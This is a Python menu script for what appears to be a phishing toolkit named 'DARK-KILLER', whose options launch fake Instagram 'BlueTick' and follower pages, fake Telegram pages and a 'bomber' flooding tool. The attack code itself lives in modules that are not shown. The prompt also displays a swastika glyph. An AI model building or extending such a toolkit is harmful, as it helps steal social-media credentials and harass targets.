# Coded By : Sepehr telegram id >> @x_darkpy_x , channel >>> @

from banners import banner
from module import follow,helpp,tik,robot,telegram,bomber,arz
import time
import os
import sys
try:
  from colorama import Fore
  import requests
  from pyngrok import ngrok
except ImportError:
  print(Fore.RED+"\n [!] "+Fore.LIGHTCYAN_EX+"You have not installed the prerequisites!\n"+Fore.RED+" [!] "+Fore.LIGHTCYAN_EX+"Install with this command"+Fore.LIGHTBLUE_EX+" : >> "+Fore.GREEN+"pip install -r requirements.txt")


while True:
  banner.list1()
  
  try:
    num = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"DARK-KILLER"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"卐 "+Fore.GREEN)
    if num == '':
      time.sleep(0.1)
      print(Fore.RED+"[-] "+Fore.WHITE+"please Enter a Number !")
      sys.exit()
    elif num == '5':
      os.system('clear')
      sys.exit()
    elif num == '1':
      banner.list2()
      numfp = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"DARK-KILLER"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.RED+"/"+Fore.CYAN+"FakePages"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"卐 ")
      if numfp == '1':
        banner.listi()
        numi = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"DARK-KILLER"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.RED+"/"+Fore.CYAN+"FakePages"+Fore.RED+"/"+Fore.LIGHTYELLOW_EX+"Instageram"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"卐 "+Fore.GREEN)
        if numi == '1':
          banner.listfb()
          numtb = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"DARK-KILLER"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.RED+"/"+Fore.CYAN+"FakePages"+Fore.RED+"/"+Fore.LIGHTYELLOW_EX+"Instageram"+Fore.RED+"/"+Fore.BLUE+"BlueTick"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"卐 "+Fore.GREEN)
          if numtb == '1':
            tik.bot()
          elif numtb == '2':
            tik.file()
          elif numtb == '3':
            input(Fore.RED+" [+] "+Fore.CYAN+"Back To Menu (press Enter...) ")
          else:
            sys.exit()
        elif numi == '2':
          banner.listfb()
          numtb = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"DARK-KILLER"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.RED+"/"+Fore.CYAN+"FakePages"+Fore.RED+"/"+Fore.LIGHTYELLOW_EX+"Instageram"+Fore.RED+"/"+Fore.BLUE+"InstaFollowers"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"卐 "+Fore.GREEN)
          if numtb == '1':
            follow.bot()
          elif numtb == '2':
            follow.file()
          elif numtb == '3':
            input(Fore.RED+"\n [+] "+Fore.CYAN+"Back To Menu (press Enter...) ")
          else:
            sys.exit()
        elif numi == '3':
            input(Fore.RED+" [+] "+Fore.CYAN+"Back To Menu (press Enter...) ")
        else:
          sys.exit()
      elif numfp == '2':
        banner.listt()
        numt = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"DARK-KILLER"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.RED+"/"+Fore.CYAN+"FakePages"+Fore.RED+"/"+Fore.LIGHTYELLOW_EX+"Telegram"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"卐 "+Fore.GREEN)
        if numt == '1':
          banner.listfb()
          numtb = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"DARK-KILLER"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.RED+"/"+Fore.CYAN+"FakePages"+Fore.RED+"/"+Fore.LIGHTYELLOW_EX+"Telegram"+Fore.RED+"/"+Fore.BLUE+"BotMaker"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"卐 "+Fore.GREEN)
          if numtb == '1':
            robot.bot()
          elif numtb == '2':
            robot.file()
          elif numtb == '3':
            input(Fore.RED+" [+] "+Fore.CYAN+"Back To Menu (press Enter...) ")
          else:
            sys.exit()
        elif numt == '2':
          banner.listfb()
          numtb = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"DARK-KILLER"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.RED+"/"+Fore.CYAN+"FakePages"+Fore.RED+"/"+Fore.LIGHTYELLOW_EX+"Telegram"+Fore.RED+"/"+Fore.BLUE+"telegram"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"卐 "+Fore.GREEN)
          if numtb == '1':
            robot.bot()
          elif numtb == '2':
            robot.file()
          elif numtb == '3':
            input(Fore.RED+" [+] "+Fore.CYAN+"Back To Menu (press Enter...) ")
          else:
            sys.exit()
        elif numt == '3':
          input(Fore.RED+" [+] "+Fore.CYAN+"Back To Menu (press Enter...) ")
        else:
          sys.exit()
      elif numfp == '3':
        input(Fore.RED+" [+] "+Fore.CYAN+"Back To Menu (press Enter...) ")
      else:
        sys.exit()
    elif num == '2':
      banner.list3()
    elif num == '3':
      banner.listo()
      numo = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"DARK-KILLER"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.RED+"/"+Fore.CYAN+"Other"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"卐 ")
      if numo == '1':
        bomber.file()
      elif numo == '2':
        arz.file()
      elif numo == '3':
        input(Fore.RED+" [+] "+Fore.CYAN+"Back To Menu (press Enter...) ")
      else:
        sys.exit()
    elif num == '4':
      helpp.file()
    else:
      print(Fore.RED+"[!] "+Fore.LIGHTRED_EX+"please Enter a Number ;)")
      sys.exit()
  except:
    print(Fore.CYAN+"\n [!] Bye ")
    sys.exit()